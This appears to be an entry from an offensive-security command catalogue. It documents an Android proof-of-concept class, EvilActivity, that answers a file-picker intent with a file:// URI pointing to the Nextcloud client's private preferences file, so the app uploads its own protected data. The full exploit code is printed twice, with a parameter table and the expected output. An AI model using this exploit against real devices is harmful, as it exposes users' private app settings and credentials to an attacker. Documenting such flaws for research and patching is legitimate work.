---
id: uuid-cmd-2
data: >-
  public class EvilActivity extends AppCompatActivity { private static final
  String LOG_TAG = EvilActivity.class.getName(); final static String PRIVATE_URI
  =
  "file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml";
  @Override protected void onCreate(@Nullable Bundle savedInstanceState) {
  super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
  Log.d("heen", "EvilActivity started!"); setResult(-1, new
  Intent().setData(Uri.parse(PRIVATE_URI))); finish(); } }
tags:
  - poc
  - activity
  - uri
type: command
output: >-
  Returns RESULT_OK (-1) with Intent containing private file URI, allowing
  calling app to access the file.
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:41.928Z'
verified: false
validated: true
submitted: true
---
# EvilActivity POC

## Command

```java
public class EvilActivity extends AppCompatActivity { private static final String LOG_TAG = EvilActivity.class.getName(); final static String PRIVATE_URI = "file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml"; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d("heen", "EvilActivity started!"); setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI))); finish(); } }
```

## Description

This Android Activity class serves as a malicious file provider in a POC app, responding to picker intents by supplying a URI to a protected file in the Nextcloud app's private storage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PRIVATE_URI | Static URI to sensitive file (e.g., preferences.xml) | Yes |
| setResult(-1, intent) | Sets activity result with OK code and URI data | Yes |

## Examples

### Basic Usage

```java
public class EvilActivity extends AppCompatActivity { ... setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI))); finish(); }
```

### In Intent Response

Triggered by file picker, logs start and immediately returns URI.

## Expected Output

Activity starts, logs "EvilActivity started!", sets result with private URI, and finishes. Calling app (Nextcloud) receives URI for upload.

## Related

- [[Related Procedure: Install Malicious POC App for File URI Provision]]
